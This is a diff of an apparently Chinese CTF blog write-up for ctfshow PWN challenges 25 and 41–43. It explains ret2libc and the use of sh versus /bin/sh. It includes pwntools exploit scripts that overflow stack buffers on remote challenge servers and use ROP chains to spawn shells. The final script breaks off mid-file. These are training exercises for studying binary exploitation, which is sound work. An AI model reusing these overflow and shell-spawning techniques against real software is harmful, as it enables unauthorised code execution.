@@ -6,11 +6,11 @@
 
 <link rel='canonical' href='https://expl0rer.top/p/ctfshow-pwn-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.2c77b19359813276c65acd84dec34da71ed0ee906a8812f34e2c2899887b4ce7.css"><meta property='og:title' content="ctfshow-pwn-writeup">
+<link rel="stylesheet" href="/scss/style.min.4bd4146745b8cfb7d738bd4abe865979f0ea7240549e1e4a81cc0e68784b07a0.css"><meta property='og:title' content="ctfshow-pwn-writeup">
 <meta property='og:description' content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题">
 <meta property='og:url' content='https://expl0rer.top/p/ctfshow-pwn-writeup/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-02T00:04:55&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-11T13:02:33&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
 <meta name="twitter:title" content="ctfshow-pwn-writeup">
 <meta name="twitter:description" content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
@@ -763,6 +763,7 @@ unicode: "ece7"
         </li>
         <li><a href="#pwn_025待定">PWN_025（待定）</a>
           <ol>
+            <li><a href="#ret2libc攻击">ret2libc攻击</a></li>
             <li><a href="#ret2libc实现步骤">ret2libc实现步骤</a></li>
           </ol>
         </li>
@@ -788,7 +789,25 @@ unicode: "ece7"
         <li><a href="#pwn_039">PWN_039</a></li>
         <li><a href="#pwn_040">PWN_040</a></li>
         <li><a href="#32位和64位可执行程序的参数传递顺序"><strong>32位和64位可执行程序的参数传递顺序</strong></a></li>
-        <li><a href="#pwn_041">PWN_041</a></li>
+        <li><a href="#pwn_041">PWN_041</a>
+          <ol>
+            <li><a href="#题目-1">题目：</a></li>
+            <li><a href="#binsh和sh的核心区别"><strong>/bin/sh和sh的核心区别</strong></a></li>
+          </ol>
+        </li>
+        <li><a href="#pwn_042">PWN_042</a></li>
+        <li><a href="#pwn_043">PWN_043</a></li>
+        <li><a href="#pwn_044">PWN_044</a></li>
+        <li><a href="#pwn_045">PWN_045</a></li>
+        <li><a href="#pwn_046待定">PWN_046（待定）</a></li>
+        <li><a href="#pwn_047">PWN_047</a></li>
+        <li><a href="#pwn_048">PWN_048</a></li>
+        <li><a href="#pwn_049">PWN_049</a>
+          <ol>
+            <li><a href="#mprotect函数">Mprotect函数</a></li>
+          </ol>
+        </li>
+        <li><a href="#pwn_050">PWN_050</a></li>
       </ol>
     </li>
   </ol>
@@ -2868,7 +2887,8 @@ unicode: "ece7"
 </h3><p>题目：开启NX保护，或许可以试试ret2libc</p>
 <p><a class="link" href="PWN_025" >PWN_025</a></p>
 <p>根据题目，也就是说具体攻击手法为：<code>ret2libc</code></p>
-<p><code>ret2libc</code> 是一种在二进制漏洞利用中的经典技术，全称为 “return - to - libc”，中文可理解为 “返回至 libc 库”，常用于绕过栈不可执行（<code>NX</code>，No - eXecute）保护机制。</p>
+<h4 id="ret2libc攻击">ret2libc攻击
+</h4><p><code>ret2libc</code> 是一种在二进制漏洞利用中的经典技术，全称为 “return - to - libc”，中文可理解为 “返回至 libc 库”，常用于绕过栈不可执行（<code>NX</code>，No - eXecute）保护机制。</p>
 <blockquote>
 <h4 id="ret2libc实现步骤">ret2libc实现步骤
 </h4><ol>
@@ -2920,6 +2940,19 @@ unicode: "ece7"
 	
 ></p>
 <p>可以发现buf大小为 132 字节，但read允许读取 0x100（256）字节存在栈溢出漏洞。</p>
+<p>跟进write函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/87%EF%BC%881%EF%BC%89.png"
+	width="726"
+	height="135"
+	srcset="/p/ctfshow-pwn-writeup/87%EF%BC%881%EF%BC%89_hu_e35dedabfd39796d.png 480w, /p/ctfshow-pwn-writeup/87%EF%BC%881%EF%BC%89_hu_f0ccf21542fa3cb6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="537"
+		data-flex-basis="1290px"
+	
+></p>
 <p>IDAx32分析，也没有/bin/sh、后门system：</p>
 <p><img src="/p/ctfshow-pwn-writeup/69.png"
 	width="1324"
@@ -2963,9 +2996,11 @@ unicode: "ece7"
 <li>计算system函数和/bin/sh字符串的真实地址。</li>
 <li>继续从ctfshow函数里的栈溢出作为入口，跳转到system函数真实地址，同时将/bin/sh作为参数传入，从而拿到权限。</li>
 </ol></blockquote>
-<p>&hellip;.<a class="link" href="https://www.cnblogs.com/Claire-cat/articles/19029030"  target="_blank" rel="noopener"
-    >从CTFshow-PWN入门-pwn25分析ret2libc原理与实现 - Claire_cat - 博客园</a></p>
-<p>ret2libc攻击（即先找到栈溢出漏洞，通过write函数泄露 write 函数的真实地址，根据泄露的 write 函数地址，使用 LibcSearcher 来搜索 libc 库中相应的函数地址和字符串地址，获取 system 函数和&quot;/bin/sh&quot; 字符串的地址。构造新的 payload，使用泄露的 system 函数和 &ldquo;/bin/sh&rdquo; 字符串的地址来进行get shell）</p>
+<blockquote>
+<p>这里之前我是跳过的，比较难，我做到PWN_044之后才倒回来做的。</p>
+<p>PWN044 的利用逻辑是 “先调用 <code>gets</code> 向 <code>bss</code> 段写入 <code>/bin/sh</code>，再调用 <code>system</code> 执行”（类似文档中 PWN044 的 <code>gets</code> 调用场景）。此时调用 <code>gets</code> 仅需其 “函数入口” 即可完成数据写入，无需知道 <code>gets</code> 在 <code>libc</code> 中的真实地址 —— 直接使用 <code>gets</code> 的 PLT 表地址（<code>p32(gets)</code> 本质是 <code>p32(gets_plt)</code>），就能触发 <code>gets</code> 执行，实现写入 <code>/bin/sh</code> 的目标。这就是为什么在PWN_044是直接是p32(gets)，而在这调用write函数是要分.got和.plt，因为它俩功能都不同。</p>
+<p><code>write_plt</code> 负责 “触发 <code>write</code> 执行”，<code>write_got</code> 负责 “提供待泄露的真实地址”，二者缺一不可，因此必须明确区分。</p></blockquote>
+<p><strong>总之：ret2libc 核心逻辑：“泄露地址→计算地址→构造调用”</strong></p>
 <p>exp备注版：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -3057,7 +3092,7 @@ unicode: "ece7"
 </span></span><span class="line"><span class="cl"><span class="c1"># 4. write函数的参数1：文件描述符0（错误！应为1，stdout标准输出，否则无法正确泄露数据）</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 5. write函数的参数2：要泄露的地址（write@got，存储write的真实内存地址）</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 6. write函数的参数3：泄露的字节数（4字节，32位地址长度）</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 发送第一次payload，触发栈溢出，执行write函数泄露地址</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -3140,7 +3175,7 @@ unicode: "ece7"
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这里的内容为后续栈部分讲解内容，目前WP在前面不做详细讲解，目的仅为了演示在开启某些保护可以使用哪些攻击手法（好吧其实我也不会，这些是抄的wp，这里等我学会栈这部分我再来解决，PWN确实入门比较难，深入学更难&hellip;.）</p>
+</div><p>这部分主要涉及到栈溢出的章节知识点，我已经讲解的很详细很啰嗦了，如果看不懂就跳过吧，把栈溢出搞懂后再跳回来做。我当时也是跳过的，之后再回来写wp的。</p>
 <p>感觉强度上来了，做得有点吃力。</p>
 <h3 id="pwn_026">PWN_026
 </h3><p>题目：设置好 ASLR 保护参数值即可获得flag。为确保flag正确，本题建议用提供虚拟机运行。  <a class="link" href="PWN_26%5cPWN" >PWN</a>  <a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
@@ -4508,7 +4543,1051 @@ unicode: "ece7"
 <li><strong>64 位程序（PWN40）</strong>：64 位程序的函数调用规则有所不同，前 6 个参数优先通过寄存器传递，其中第一个参数存放在<code>rdi</code>寄存器。在 PWN40 中，<code>payload = 'a'*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</code> ，<code>'a'*(0xA + 8)</code>用于填充缓冲区和覆盖原返回地址；<code>p64(pop_rdi)</code>将<code>pop_rdi</code>指令地址放入栈中，执行<code>pop_rdi</code>指令时，会把紧跟其后的<code>p64(bin_sh)</code>中的<code>/bin/sh</code>地址弹出到<code>rdi</code>寄存器，作为<code>system</code>函数的第一个参数；<code>p64(ret)</code>用于栈对齐（64 位程序调用函数前需要保证栈 16 字节对齐，<code>ret</code>指令可调整栈指针）；最后<code>p64(system)</code>将<code>system</code>函数地址放入栈中，当程序执行到这里时，会跳转到<code>system</code>函数执行，此时<code>rdi</code>寄存器中已正确设置了参数<code>/bin/sh</code>的地址。</li>
 </ul></blockquote></blockquote>
 <h3 id="pwn_041">PWN_041
-</h3><p>题目：32位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代。 <a class="link" href="PWN_041" >PWN_041</a></p>
+</h3><h4 id="题目-1">题目：
+</h4><p>32位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代。 <a class="link" href="PWN_041" >PWN_041</a></p>
+<p>checksec一下，然后IDA分析</p>
+<p><img src="/p/ctfshow-pwn-writeup/126.png"
+	width="1055"
+	height="206"
+	srcset="/p/ctfshow-pwn-writeup/126_hu_50a6b7b4540d004f.png 480w, /p/ctfshow-pwn-writeup/126_hu_a5b594f7bf368fe2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="512"
+		data-flex-basis="1229px"
+	
+></p>
+<p>不能用ret2shellcode了。</p>
+<p>这里和上题差不多，找一下/bin/sh：</p>
+<p><img src="/p/ctfshow-pwn-writeup/123.png"
+	width="1550"
+	height="630"
+	srcset="/p/ctfshow-pwn-writeup/123_hu_bbacdeabd557b527.png 480w, /p/ctfshow-pwn-writeup/123_hu_7ec5c23639120ed9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="590px"
+	
+></p>
+<p>找不到，但找到sh：</p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<h4 id="binsh和sh的核心区别"><strong>/bin/sh和sh的核心区别</strong>
+</h4><p>关键场景：能否替代取决于「调用函数的要求」</p>
+<p>PWN 中最常用的是通过 <code>execve、system</code> 函数执行 Shell（如构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 获得交互权限），此外也可能涉及 <code>system</code> 函数，两者对参数的要求不同：</p>
+<p>场景 1：<code>execve</code> 函数（必须用绝对路径，<code>sh</code> 不可替代 <code>/bin/sh</code>）</p>
+<p><code>execve</code> 是 Linux 系统调用，作用是加载并执行新程序，其第一个参数<strong>必须是程序的绝对路径</strong>（或相对路径，但绝对路径是 PWN 中的常规选择），否则会报错「No such file or directory」。</p>
+<ul>
+<li>正确用法：<code>execve(&quot;/bin/sh&quot;, ...)</code>（系统直接定位到 <code>/bin/sh</code>，执行成功）。</li>
+<li>错误用法：<code>execve(&quot;sh&quot;, ...)</code>（系统不知道 <code>sh</code> 在哪里，会遍历 <code>$PATH</code> 查找，但 <code>execve</code> 不支持通过 <code>$PATH</code> 解析命令名，直接失败）。</li>
+</ul>
+<p>因此，在构造 <code>execve</code> 调用时，<strong>只能用 <code>/bin/sh</code>，不能用 <code>sh</code></strong>。</p>
+<p>场景 2：<code>system</code> 函数（<code>sh</code> 和 <code>/bin/sh</code> 效果一致，可替代）</p>
+<p><code>system</code> 函数的底层逻辑是「调用 <code>/bin/sh -c</code> 来执行参数中的命令」，其参数支持「命令名」或「绝对路径」：</p>
+<ul>
+<li>若传 <code>system(&quot;sh&quot;)</code>：<code>system</code> 会自动通过 <code>$PATH</code> 找到 <code>sh</code>（即 <code>/bin/sh</code>），等价于执行 <code>/bin/sh -c sh</code>，最终启动 Shell。</li>
+<li>若传 <code>system(&quot;/bin/sh&quot;)</code>：等价于执行 <code>/bin/sh -c /bin/sh</code>，同样启动 Shell。</li>
+</ul>
+<p>因此，在使用 <code>system</code> 函数时，<strong><code>sh</code> 和 <code>/bin/sh</code> 效果完全一致，可以互相替代</strong>。</p>
+<p><strong>特殊情况</strong>：环境变量 <code>$PATH</code> 被篡改（<code>sh</code> 可能失效，<code>/bin/sh</code> 更可靠）</p>
+<p>虽然多数情况下 <code>$PATH</code> 包含 <code>/bin</code>，但如果目标程序运行时篡改了 <code>$PATH</code>（如删除 <code>/bin</code> 目录），此时：</p>
+<ul>
+<li>用 <code>sh</code> 会因 <code>$PATH</code> 中找不到 <code>sh</code> 而失败；</li>
+<li>用 <code>/bin/sh</code> 因是绝对路径，不受 <code>$PATH</code> 影响，依然能成功执行。</li>
+</ul>
+<p>PWN 利用中为了「兼容性和稳定性」，即使是 <code>system</code> 函数，也更推荐写 <code>/bin/sh</code> 而非 <code>sh</code>（避免因环境变量异常导致利用失败）。</p></blockquote></blockquote>
+<p>这里跟进hint函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/125.png"
+	width="838"
+	height="150"
+	srcset="/p/ctfshow-pwn-writeup/125_hu_2475afccf8340c50.png 480w, /p/ctfshow-pwn-writeup/125_hu_f610554b4ea5f28d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="558"
+		data-flex-basis="1340px"
+	
+></p>
+<p>发现这有现成的system函数，也就是说可以调用sh去进行提权。</p>
+<p>知道了sh地址是0x80487BA，就可以写exp了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28261</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x80487BA</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_042">PWN_042
+</h3><p>题目：64位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代。 <a class="link" href="PWN_042" >PWN_042</a></p>
+<p>来看IDA64位分析：</p>
+<p><img src="/p/ctfshow-pwn-writeup/128.png"
+	width="670"
+	height="180"
+	srcset="/p/ctfshow-pwn-writeup/128_hu_773d0a462a9bb4a6.png 480w, /p/ctfshow-pwn-writeup/128_hu_8acb802bbfbe83f2.png 1024w"
+	loading="lazy"
+	
+		alt="存在栈溢出"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="372"
+		data-flex-basis="893px"
+	
+></p>
+<p>checksec：</p>
+<p><img src="/p/ctfshow-pwn-writeup/129.png"
+	width="946"
+	height="234"
+	srcset="/p/ctfshow-pwn-writeup/129_hu_720d126d72ab49b9.png 480w, /p/ctfshow-pwn-writeup/129_hu_e7d4450d3040833.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="970px"
+	
+></p>
+<p>在跟进hint函数也是如此，和PWN_041一样的，这次程序是64位，<a class="link" href="https://expl0rer.top/p/ctfshow-pwn-writeup/#32%e4%bd%8d%e5%92%8c64%e4%bd%8d%e5%8f%af%e6%89%a7%e8%a1%8c%e7%a8%8b%e5%ba%8f%e7%9a%84%e5%8f%82%e6%95%b0%e4%bc%a0%e9%80%92%e9%a1%ba%e5%ba%8f"  target="_blank" rel="noopener"
+    >在exp编写上有所不同</a>，需要pop_rdi：ret、ret的地址：</p>
+<p><img src="/p/ctfshow-pwn-writeup/130.png"
+	width="1265"
+	height="375"
+	srcset="/p/ctfshow-pwn-writeup/130_hu_5a7538fd605e720d.png 480w, /p/ctfshow-pwn-writeup/130_hu_a866cc865737ff56.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="337"
+		data-flex-basis="809px"
+	
+></p>
+<p>ret：0x40053e</p>
+<p>pop_rdi：0x400843</p>
+<p>再找sh的地址吧：</p>
+<p><img src="/p/ctfshow-pwn-writeup/131.png"
+	width="1096"
+	height="204"
+	srcset="/p/ctfshow-pwn-writeup/131_hu_6a6662067bbd0f05.png 480w, /p/ctfshow-pwn-writeup/131_hu_9a6c214336b69472.png 1024w"
+	loading="lazy"
+	
+		alt="sh的地址是0x400872"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="537"
+		data-flex-basis="1289px"
+	
+></p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28281</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x400872</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40053e</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400843</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag就不给了，因为靶机给的flag是动态的。</p>
+<h3 id="pwn_043">PWN_043
+</h3><p>题目：32位的 system(); 但是好像没&quot;/bin/sh&quot; 上面的办法不行了，想想办法。 <a class="link" href="PWN_043" >PWN_043</a></p>
+<p>IDA32位跟进ctfshow函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/132.png"
+	width="875"
+	height="151"
+	srcset="/p/ctfshow-pwn-writeup/132_hu_c59120af2cb1695a.png 480w, /p/ctfshow-pwn-writeup/132_hu_cb4a8ac9d3d15d72.png 1024w"
+	loading="lazy"
+	
+		alt="gets栈溢出"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="579"
+		data-flex-basis="1390px"
+	
+></p>
+<p>gets函数很危险的，一般都用fgets，用这个必溢出的好吧&hellip;&hellip;</p>
+<p>跟进hint函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/133.png"
+	width="896"
+	height="339"
+	srcset="/p/ctfshow-pwn-writeup/133_hu_6591d04ae9fff383.png 480w, /p/ctfshow-pwn-writeup/133_hu_7fceb86594aae882.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="634px"
+	
+></p>
+<p>我们发现了system函数，但却不提供sh、/bin/sh给我们，只能利用gets函数。（gets函数进行读入数据，它可以无限读取到<strong>内存</strong>，不会判断上限，可以包含空格，以回车结束读取。所以这里就存在了明显的溢出）</p>
+<p>那大致的exp思路来了；先用cyclic产生垃圾值填充缓冲区和ebp本身，出现栈溢出后，将返回值覆盖为gets函数地址，加上ebx寄存器弹栈，gets函数读取数据，把我们所给的/bin/sh字符串写入这个内存里面，再次利用栈溢出，将返回地址覆盖为 system 函数的地址，使得 gets 执行完后，程序自动跳转到 system 执行，执行 <code>system(&quot;/bin/sh&quot;)</code> 获取 shell。</p>
+<p>这个内存去哪找？</p>
+<p>在bss字段（未初始化字段）找到了buf2变量：</p>
+<p><img src="/p/ctfshow-pwn-writeup/134.png"
+	width="929"
+	height="215"
+	srcset="/p/ctfshow-pwn-writeup/134_hu_e07f711cd6a6e5ef.png 480w, /p/ctfshow-pwn-writeup/134_hu_4dc65a9b43ad1b81.png 1024w"
+	loading="lazy"
+	
+		alt="buf2：未定义的内存变量"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="432"
+		data-flex-basis="1037px"
+	
+></p>
+<p>查询pop_ebx的地址</p>
+<p><img src="/p/ctfshow-pwn-writeup/135.png"
+	width="1245"
+	height="505"
+	srcset="/p/ctfshow-pwn-writeup/135_hu_d45e675ff438bc16.png 480w, /p/ctfshow-pwn-writeup/135_hu_c1d3ce761cd87966.png 1024w"
+	loading="lazy"
+	
+		alt="pop_ebx的地址是0x8048409"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="591px"
+	
+></p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28152</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gets</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x8048409</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;buf2&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6C</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
